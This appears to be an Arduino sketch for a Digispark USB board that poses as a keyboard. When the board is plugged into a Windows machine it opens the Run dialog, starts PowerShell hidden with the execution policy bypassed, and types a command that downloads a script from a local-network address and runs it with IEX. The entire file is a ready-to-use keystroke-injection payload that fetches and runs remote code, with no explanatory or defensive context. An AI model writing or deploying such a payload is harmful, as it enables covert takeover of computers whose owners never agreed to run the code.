#include "DigiKeyboard.h"

void setup()
{
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(120);
  DigiKeyboard.println("powershell -ExecutionPolicy Bypass -WindowStyle hidden");
  DigiKeyboard.delay(240);
  DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadString('http://192.168.0.10/1.ps1') | IEX");
}

void loop()
{
}
